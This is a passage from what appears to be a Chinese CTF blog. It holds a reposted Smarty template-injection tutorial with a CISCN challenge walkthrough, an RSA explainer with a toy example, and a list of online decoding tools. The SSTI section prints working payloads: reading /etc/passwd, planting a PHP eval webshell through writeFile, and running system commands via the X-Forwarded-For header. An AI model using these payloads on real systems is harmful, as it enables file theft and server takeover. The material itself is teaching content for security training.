-<p>但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读<a target="_blank" rel="noopener" href="https://github.com/smarty-php/smarty">模板的文档</a>以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法</p>
-<p>smarty&#x2F;libs&#x2F;sysplugins&#x2F;smarty_internal_data.php　　——&gt;　　getStreamVariable() 这个方法可以获取传入变量的流</p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200910234359019-777787778.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200910234359019-777787778.png" alt="img"></a></p>
-<p>因此我们可以用这个方法读文件，payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;</span><br></pre></td></tr></table></figure>
-
-<p>同样</p>
-<p>smarty&#x2F;libs&#x2F;sysplugins&#x2F;smarty_internal_write_file.php　　——&gt;　　Smarty_Internal_Write_File 这个类中有一个writeFile方法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Smarty_Internal_Write_File</span><br><span class="line">&#123;</span><br><span class="line">    /**</span><br><span class="line">     * Writes file in a safe way to disk</span><br><span class="line">     *</span><br><span class="line">     * @param  string $_filepath complete filepath</span><br><span class="line">     * @param  string $_contents file content</span><br><span class="line">     * @param  Smarty $smarty    smarty instance</span><br><span class="line">     *</span><br><span class="line">     * @throws SmartyException</span><br><span class="line">     * @return boolean true</span><br><span class="line">     */</span><br><span class="line">    public function writeFile($_filepath, $_contents, Smarty $smarty)</span><br><span class="line">    &#123;</span><br><span class="line">        $_error_reporting = error_reporting();</span><br><span class="line">        error_reporting($_error_reporting &amp; ~E_NOTICE &amp; ~E_WARNING);</span><br><span class="line">        if ($smarty-&gt;_file_perms !== null) &#123;</span><br><span class="line">            $old_umask = umask(0);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_dirpath = dirname($_filepath);</span><br><span class="line">        // if subdirs, create dir structure</span><br><span class="line">        if ($_dirpath !== &#x27;.&#x27; &amp;&amp; !file_exists($_dirpath)) &#123;</span><br><span class="line">            mkdir($_dirpath, $smarty-&gt;_dir_perms === null ? 0777 : $smarty-&gt;_dir_perms, true);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // write to tmp file, then move to overt file lock race condition</span><br><span class="line">        $_tmp_file = $_dirpath . DS . str_replace(array(&#x27;.&#x27;, &#x27;,&#x27;), &#x27;_&#x27;, uniqid(&#x27;wrt&#x27;, true));</span><br><span class="line">        if (!file_put_contents($_tmp_file, $_contents)) &#123;</span><br><span class="line">            error_reporting($_error_reporting);</span><br><span class="line">            throw new SmartyException(&quot;unable to write file &#123;$_tmp_file&#125;&quot;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line">         * Windows&#x27; rename() fails if the destination exists,</span><br><span class="line">         * Linux&#x27; rename() properly handles the overwrite.</span><br><span class="line">         * Simply unlink()ing a file might cause other processes</span><br><span class="line">         * currently reading that file to fail, but linux&#x27; rename()</span><br><span class="line">         * seems to be smart enough to handle that for us.</span><br><span class="line">         */</span><br><span class="line">        if (Smarty::$_IS_WINDOWS) &#123;</span><br><span class="line">            // remove original file</span><br><span class="line">            if (is_file($_filepath)) &#123;</span><br><span class="line">                @unlink($_filepath);</span><br><span class="line">            &#125;</span><br><span class="line">            // rename tmp file</span><br><span class="line">            $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // rename tmp file</span><br><span class="line">            $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">            if (!$success) &#123;</span><br><span class="line">                // remove original file</span><br><span class="line">                if (is_file($_filepath)) &#123;</span><br><span class="line">                    @unlink($_filepath);</span><br><span class="line">                &#125;</span><br><span class="line">                // rename tmp file</span><br><span class="line">                $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$success) &#123;</span><br><span class="line">            error_reporting($_error_reporting);</span><br><span class="line">            throw new SmartyException(&quot;unable to write file &#123;$_filepath&#125;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if ($smarty-&gt;_file_perms !== null) &#123;</span><br><span class="line">            // set file permissions</span><br><span class="line">            chmod($_filepath, $smarty-&gt;_file_perms);</span><br><span class="line">            umask($old_umask);</span><br><span class="line">        &#125;</span><br><span class="line">        error_reporting($_error_reporting);</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到 writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self::clearConfig()，函数原型：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function clearConfig($varname = null)</span><br><span class="line">&#123;</span><br><span class="line">    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>因此我们可以构造payload写个webshell:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>CTF实例讲解</strong></p>
-<p>CTF地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges%EF%BC%88CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BAWeb11%EF%BC%89">https://buuoj.cn/challenges（CISCN2019华东南赛区Web11）</a></p>
-<p>题目模拟了一个获取IP的API，并且可以在最下方看到 “Build With Smarty !” 可以确定页面使用的是Smarty模板引擎。</p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820231808793-180982707.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820231808793-180982707.png" alt="img"></a></p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232249193-1694257286.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232249193-1694257286.png" alt="img"></a></p>
-<p>在页面的右上角发现了IP，但是题目中显示的API的URL由于环境的原因无法使用，猜测这个IP受X-Forwarded-For头控制。</p>
-<p>将XFF头改为 {6*7} 会发现该位置的值变为了42，便可以确定这里存在SSTI。</p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232629595-1646272720.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232629595-1646272720.png" alt="img"></a></p>
-<p>直接构造 {system(‘cat &#x2F;flag’)} 即可得到flag</p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232839480-729397105.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232839480-729397105.png" alt="img"></a></p>
-<p><strong>Smarty-SSTI常规利用方式：</strong></p>
-<p><strong>1. {$smarty.version}</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;$smarty.version&#125;  #获取smarty的版本号</span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233050238-1942906786.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233050238-1942906786.png" alt="img"></a></p>
-<p><strong>2. {php}{&#x2F;php}</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;php&#125;phpinfo();&#123;/php&#125;  #执行相应的php代码</span><br></pre></td></tr></table></figure>
-
-<p>Smarty支持使用 {php}{&#x2F;php} 标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但就该题目而言，使用{php}{&#x2F;php}标签会报错：</p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233259128-196602210.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233259128-196602210.png" alt="img"></a></p>
-<p>因为在Smarty3版本中已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。</p>
-<p><strong>3. {literal}</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt;   </span><br></pre></td></tr></table></figure>
-
-<p>这个地方借助了 {literal} 这个标签，因为 {literal} 可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。但是这种写法只适用于php5环境，这道ctf使用的是php7，所以依然失败</p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233719367-1535357026.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233719367-1535357026.png" alt="img"></a></p>
-<p><strong>4.</strong> <strong>getstreamvariable</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Smarty类的getStreamVariable方法的代码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function getStreamVariable($variable)</span><br><span class="line">&#123;</span><br><span class="line">        $_result = &#x27;&#x27;;</span><br><span class="line">        $fp = fopen($variable, &#x27;r+&#x27;);</span><br><span class="line">        if ($fp) &#123;</span><br><span class="line">            while (!feof($fp) &amp;&amp; ($current_line = fgets($fp)) !== false) &#123;</span><br><span class="line">                $_result .= $current_line;</span><br><span class="line">            &#125;</span><br><span class="line">            fclose($fp);</span><br><span class="line">            return $_result;</span><br><span class="line">        &#125;</span><br><span class="line">        $smarty = isset($this-&gt;smarty) ? $this-&gt;smarty : $this;</span><br><span class="line">        if ($smarty-&gt;error_unassigned) &#123;</span><br><span class="line">            throw new SmartyException(&#x27;Undefined stream variable &quot;&#x27; . $variable . &#x27;&quot;&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法。然而使用这个payload会触发报错如下：</p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234305773-495371489.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234305773-495371489.png" alt="img"></a></p>
-<p>可见这个旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经把该静态方法删除。 对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</p>
-<p><strong>5. {if}{&#x2F;if}</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Smarty的 {if} 条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{&#x2F;if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||<em>，or，&amp;&amp;，and，is_array()等等，如：{if is_array($array)}{&#x2F;if}</em></p>
-<p>既然这样就将XFF头改为 {if phpinfo()}{&#x2F;if} ：</p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234610811-341143885.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234610811-341143885.png" alt="img"></a></p>
-<p>同样还能用来执行一些系统命令：</p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234755671-2008092498.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234755671-2008092498.png" alt="img"></a></p>
-<p><strong>CTF漏洞成因</strong></p>
-<p>本题中引发SSTI的代码简化后如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    require_once(&#x27;./smarty/libs/&#x27; . &#x27;Smarty.class.php&#x27;);</span><br><span class="line">    $smarty = new Smarty();</span><br><span class="line">    $ip = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];</span><br><span class="line">    $smarty-&gt;display(&quot;string:&quot;.$ip);     // display函数把标签替换成对象的php变量；显示模板</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到这里使用字符串代替smarty模板，导致了注入的Smarty标签被直接解析执行，产生了SSTI。</p>
-<p>为转载，原博客为：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)</a></p>
-</blockquote>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2024/05/13/ssti/ssti/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/05/13/%E5%AF%86%E7%A0%81/rsa/">
-        <h2 class="post-title">rsa</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/5/13
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>RSA加密算法是一种非对称加密算法。RSA是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的。</p>
-<p>1973年，在英国政府通讯总部工作的数学家克利福德·柯克斯（Clifford Cocks）在一个内部文件中提出了一个相同的算法，但他的发现被列入机密，一直到1997年才被发表。</p>
-<p><strong>对极大整数做因数分解的难度决定了RSA算法的可靠性。</strong> 换言之，对一极大整数做因数分解愈困难，RSA算法愈可靠。<strong>假如有人找到一种快速因数分解的算法的话，那么用RSA加密的信息的可靠性就肯定会极度下降。</strong> 但找到这样的算法的可能性是非常小的。今天只有短的RSA钥匙才可能被强力方式解破。到目前为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。</p>
-<h2 id="一、举一个通俗易懂的例子"><a href="#一、举一个通俗易懂的例子" class="headerlink" title="一、举一个通俗易懂的例子"></a>一、举一个通俗易懂的例子</h2><p>看一个数学小魔术：</p>
-<p><strong>让A写下一个任意3位数，并将这个数和91相乘；然后将积的最后三位数告诉B，这样B就可以计算出A写下的是什么数字了。</strong></p>
-<ul>
-<li>比如A写下的是123，并且A计算出123 * 91等于11193，并把结果的末三位193告诉B ；</li>
-<li>B只需要把193再乘以11，193 * 11 &#x3D; 2123 末三位就是A写下的数字了；</li>
-</ul>
-<p><strong>道理很简单，91乘以11等于1001，而任何一个三位数乘以1001后，末三位显然都不变（例如123乘以1001就等于123123）。</strong></p>
-<p>知道原理后，可以构造一个定义域和值域更大的加密解密系统。<br>例如：</p>
-<ul>
-<li>任意一个数乘以400000001后，末8位都不变，而400000001 &#x3D; 19801 * 20201。于是A来乘以19801，B来乘以20201，又一个加密解密不对称的系统就构造好了；</li>
-<li>甚至可以构造得更大一些 4000000000000000000000000000001 &#x3D; 1199481995446957 * 3334772856269093，这样我们就成功构造了一个30位的加密系统；</li>
-</ul>
-<p>如果仅仅按照上面的思路，如果对方知道原理，非常容易穷举出400000001这个目标值；<strong>RSA算法使用的是指数和取模运算，本质上就是上面这套思想。</strong></p>
-<p>此段落转载自：<br><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/33645891">如何用通俗易懂的话来解释非对称加密?</a></p>
-<h2 id="二、一句话："><a href="#二、一句话：" class="headerlink" title="二、一句话："></a>二、一句话：</h2><p>对极大整数做因数分解的难度决定了RSA算法的可靠性。</p>
-<h2 id="三、RSA加密算法"><a href="#三、RSA加密算法" class="headerlink" title="三、RSA加密算法"></a>三、RSA加密算法</h2><h3 id="3-1、维基百科——RSA加密算法"><a href="#3-1、维基百科——RSA加密算法" class="headerlink" title="3.1、维基百科——RSA加密算法"></a>3.1、维基百科——RSA加密算法</h3><p>先看一下维基百科的算法描述：</p>
-<h4 id="公钥与私钥的产生"><a href="#公钥与私钥的产生" class="headerlink" title="公钥与私钥的产生"></a>公钥与私钥的产生</h4><ul>
-<li>1、随意选择两个大的质数 p和 q，p不等于 q，计算 N&#x3D;pq</li>
-<li>2、根据欧拉函数，求得 r</li>
-</ul>
-<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">r</span> = φ(N) = φ(p)φ(q) = (p-<span class="number">1</span>)(q-<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>3、选择一个小于r并与r互质的整数e，求得e关于r的模反元素，命名为d （ ed ≡ 1(mod r) 模反元素存在，当且仅当e与r互质 ）；</li>
-<li>4、销毁p和q，此时 (N , e)是公钥，(N, d)为私钥；</li>
-</ul>
-<h4 id="加密消息"><a href="#加密消息" class="headerlink" title="加密消息"></a>加密消息</h4><p>假设Bob想给Alice发送一个消息 <code>n</code>，他知道Alice产生的 <code>N</code>和 <code>e</code> ；用下面这个公式他可以将 <code>n</code>加密为 <code>c</code> ：</p>
-<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">c ≡ n^e (<span class="built_in">mod</span> N)</span><br></pre></td></tr></table></figure>
-
-<p>计算 <code>c</code>并不复杂。Bob算出 <code>c</code>后就可以将它传递给Alice。</p>
-<h4 id="解密消息"><a href="#解密消息" class="headerlink" title="解密消息"></a>解密消息</h4><p>Alice得到Bob的消息 <code>c</code>后就可以利用她的密钥<code>d</code>来解码。可以用以下这个公式来将 <code>c</code>转换为 <code>n</code>：</p>
-<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">n ≡ c^d (<span class="built_in">mod</span> N)</span><br></pre></td></tr></table></figure>
-
-<p>此段落转载自：<br><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/RSA%E5%8A%A0%E5%AF%86%E6%BC%94%E7%AE%97%E6%B3%95">维基百科——RSA加密算法</a></p>
-<h3 id="3-2、依照算法公式举个例子"><a href="#3-2、依照算法公式举个例子" class="headerlink" title="3.2、依照算法公式举个例子"></a>3.2、依照算法公式举个例子</h3><p>依照算法公式来举个例子</p>
-<h4 id="1、随意选择两个大的质数-p和-q，p不等于-q，计算-N-pq"><a href="#1、随意选择两个大的质数-p和-q，p不等于-q，计算-N-pq" class="headerlink" title="1、随意选择两个大的质数 p和 q，p不等于 q，计算 N&#x3D;pq"></a>1、随意选择两个大的质数 p和 q，p不等于 q，计算 N&#x3D;pq</h4><p><strong>质数</strong> 定义：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">除了1和该数自身外，无法被其他自然数整除的数。</span><br></pre></td></tr></table></figure>
-
-<p>举例：</p>
-<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">p</span> = <span class="number">3</span>；</span><br><span class="line"><span class="attr">q</span> = <span class="number">5</span><span class="comment">;</span></span><br><span class="line"><span class="attr">N</span> = <span class="number">3</span>*<span class="number">5</span> = <span class="number">15</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="2、根据欧拉函数，求得-r"><a href="#2、根据欧拉函数，求得-r" class="headerlink" title="2、根据欧拉函数，求得 r"></a>2、根据欧拉函数，求得 r</h4><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">r</span> = φ(N) = φ(p)φ(q) = (p-<span class="number">1</span>)(q-<span class="number">1</span>)。</span><br></pre></td></tr></table></figure>
-
-<p><strong>欧拉函数</strong> 定义：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">欧拉函数 φ(n)是小于或等于n的正整数中与n互质的数的数目。</span><br><span class="line"></span><br><span class="line">例如：φ(8) = 4，因为1,3,5,7均和8互质。</span><br></pre></td></tr></table></figure>
-
-<p>举例：</p>
-<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">r</span> = φ(N) = φ(p)φ(q) = (p-<span class="number">1</span>)(q-<span class="number">1</span>) <span class="comment">;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">r</span> = φ(<span class="number">15</span>) = φ(<span class="number">3</span>)φ(<span class="number">5</span>) = (<span class="number">3</span>-<span class="number">1</span>)(<span class="number">5</span>-<span class="number">1</span>) <span class="comment">;</span></span><br><span class="line"><span class="attr">r</span> = <span class="number">8</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="3、选择一个小于r并与r互质的整数e，求得e关于r的模反元素，命名为d-（-ed-≡-1-mod-r-模反元素存在，当且仅当e与r互质-）；"><a href="#3、选择一个小于r并与r互质的整数e，求得e关于r的模反元素，命名为d-（-ed-≡-1-mod-r-模反元素存在，当且仅当e与r互质-）；" class="headerlink" title="3、选择一个小于r并与r互质的整数e，求得e关于r的模反元素，命名为d （ ed ≡ 1(mod r) 模反元素存在，当且仅当e与r互质 ）；"></a>3、选择一个小于r并与r互质的整数e，求得e关于r的模反元素，命名为d （ ed ≡ 1(mod r) 模反元素存在，当且仅当e与r互质 ）；</h4><p><strong>互质</strong> 定义：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果两个或两个以上的整数的最大公约数是 1，则称它们为互质</span><br><span class="line"></span><br><span class="line">例如：1,3,5,7均和8互质</span><br></pre></td></tr></table></figure>
-
-<p><strong>模反元素</strong> 定义：</p>
-<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">如果两个正整数a和n互质，那么一定可以找到整数b，使得 ab-<span class="number">1</span> 被n整除，或者说ab被n除的余数是<span class="number">1</span>。</span><br><span class="line"></span><br><span class="line">例如：比如<span class="number">3</span>和<span class="number">5</span>互质，<span class="number">3</span>关于<span class="number">5</span>的模反元素就可能是<span class="number">2</span>，因为 (<span class="number">3</span>*<span class="number">2</span>)%5=<span class="number">1</span> 。</span><br></pre></td></tr></table></figure>
-
-<p>举例：</p>
-<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 选择一个小于r并与r互质的整数e (1,3,5,7均和8互质)：</span></span><br><span class="line">e = <span class="number">7</span>;</span><br><span class="line"><span class="comment">// 求得e关于r的模反元素，命名为d （    ed ≡ 1(mod r)     ) </span></span><br><span class="line"></span><br><span class="line">ed ≡ <span class="number">1</span>(<span class="keyword">mod</span> r) ;</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>*d ≡ <span class="number">1</span>(<span class="keyword">mod</span> <span class="number">8</span>) ;</span><br><span class="line"><span class="number">7</span>*d%<span class="number">8</span> = <span class="number">1</span>; </span><br><span class="line"><span class="comment">// 这里取d = 15</span></span><br><span class="line">d = <span class="number">15</span>；</span><br></pre></td></tr></table></figure>
-
-<h4 id="4、销毁p和q，此时-N-e-是公钥，-N-d-为私钥"><a href="#4、销毁p和q，此时-N-e-是公钥，-N-d-为私钥" class="headerlink" title="4、销毁p和q，此时 (N , e)是公钥，(N, d)为私钥"></a>4、销毁p和q，此时 (N , e)是公钥，(N, d)为私钥</h4><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 公钥  (N , e)</span></span><br><span class="line">( <span class="number">15</span>,<span class="number">7</span> )</span><br><span class="line"><span class="comment">// 私钥 (N, d)</span></span><br><span class="line">( <span class="number">15</span>,<span class="number">15</span> )</span><br></pre></td></tr></table></figure>
-
-<h4 id="5、加密"><a href="#5、加密" class="headerlink" title="5、加密"></a>5、加密</h4><p>假设Bob想给Alice发送一个消息 <code>n</code>，他知道Alice产生的 <code>N</code>和 <code>e</code> ；用下面这个公式他可以将 <code>n</code>加密为 <code>c</code></p>
-<p>举例：</p>
-<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">// 假设 </span><br><span class="line">n = <span class="number">2</span>;</span><br><span class="line"><span class="regexp">//</span> 计算c</span><br><span class="line">c ≡ n^e (mod N) ;</span><br><span class="line"></span><br><span class="line">(c^-<span class="number">1</span> * n^e)%N = <span class="number">1</span> ; </span><br><span class="line">(c^-<span class="number">1</span> * <span class="number">2</span>^<span class="number">7</span>)%15 = <span class="number">1</span> ;</span><br><span class="line"><span class="regexp">//</span> </span><br><span class="line">c = <span class="number">8</span>；</span><br></pre></td></tr></table></figure>
-
-<h4 id="6、解密"><a href="#6、解密" class="headerlink" title="6、解密"></a>6、解密</h4><p>Alice得到Bob的消息 <code>c</code>后就可以利用她的密钥<code>d</code>来解码。可以用以下这个公式来将 <code>c</code>转换为 <code>n</code>：</p>
-<p>举例：</p>
-<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 计算n</span></span><br><span class="line">n ≡ c^<span class="title function_ invoke__">d</span> (<span class="keyword">mod</span> N)</span><br><span class="line"></span><br><span class="line">n ≡ <span class="number">8</span>^<span class="number">15</span> (<span class="keyword">mod</span> <span class="number">15</span>) ；</span><br><span class="line">(n^-<span class="number">1</span> * <span class="number">8</span>^<span class="number">15</span>)%<span class="number">15</span> = <span class="number">1</span> ;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">n = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2024/05/13/%E5%AF%86%E7%A0%81/rsa/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/05/13/%E5%AF%86%E7%A0%81/%E5%AF%86%E7%A0%81/">
-        <h2 class="post-title">密码</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/5/13
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>常用的base编码、url编码等以及各种加密都有</p>
-<p><a target="_blank" rel="noopener" href="http://www.hiencode.com/">http://www.hiencode.com/</a></p>
-<p><a target="_blank" rel="noopener" href="https://tool.lu/">https://tool.lu/</a></p>
-<p><a target="_blank" rel="noopener" href="https://ctf.bugku.com/tools.html">https://ctf.bugku.com/tools.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.ctftools.com/down/">https://www.ctftools.com/down/</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.idcd.com/">https://www.idcd.com/</a></p>
-<p>bugku的旧在线工具可以用来枚举栅栏密码和凯撒密码</p>
-<p>md5解密</p>
-<p><a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.somd5.com/">https://www.somd5.com/</a></p>
-<p><a target="_blank" rel="noopener" href="https://pmd5.com/">https://pmd5.com/</a></p>
-<p>维吉尼亚解密</p>
-<p>很多时候可以直接跑出明文</p>
-<p><a target="_blank" rel="noopener" href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.dcode.fr/vigenere-cipher">https://www.dcode.fr/vigenere-cipher</a> (要科学上网)</p>
-<p>rot5&#x2F;13&#x2F;18&#x2F;47</p>
-<p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php">https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php</a></p>
-<p>emoji加密</p>
-<p>常见的就是base100和emoji-aes</p>
-<p><a target="_blank" rel="noopener" href="https://aghorler.github.io/emoji-aes/">https://aghorler.github.io/emoji-aes/</a></p>
-<p><a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=937">http://www.atoolbox.net/Tool.php?Id=937</a></p>
-<p><a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/base100">https://ctf.bugku.com/tool/base100</a></p>
-<p>brainfuck&#x2F;Ook！</p>
-<p><a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p>
-<p>零宽字符解密</p>
-<p><a target="_blank" rel="noopener" href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://yuanfux.github.io/zero-width-web/">https://yuanfux.github.io/zero-width-web/</a></p>
-<p><a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=829">http://www.atoolbox.net/Tool.php?Id=829</a></p>
-<p>熊曰&#x2F;兽音&#x2F;佛曰</p>
-<p><a target="_blank" rel="noopener" href="http://hi.pcmoe.net/index.html">http://hi.pcmoe.net/index.html</a></p>
-<p>需要key的佛曰</p>
-<p><a target="_blank" rel="noopener" href="https://talk-with-buddha.netlify.app/">https://talk-with-buddha.netlify.app/</a></p>
-<p>解音频里的莫斯密码</p>
-<p><a target="_blank" rel="noopener" href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">https://morsecode.world/international/decoder/audio-decoder-adaptive.html</a></p>
-<p>Quoted-printable</p>
-<p><a target="_blank" rel="noopener" href="http://web.chacuo.net/charsetquotedprintable/">http://web.chacuo.net/charsetquotedprintable/</a></p>
-<p>Rabbit解码</p>
-<p><a target="_blank" rel="noopener" href="https://www.sojson.com/encrypt_rabbit.html">https://www.sojson.com/encrypt_rabbit.html</a></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
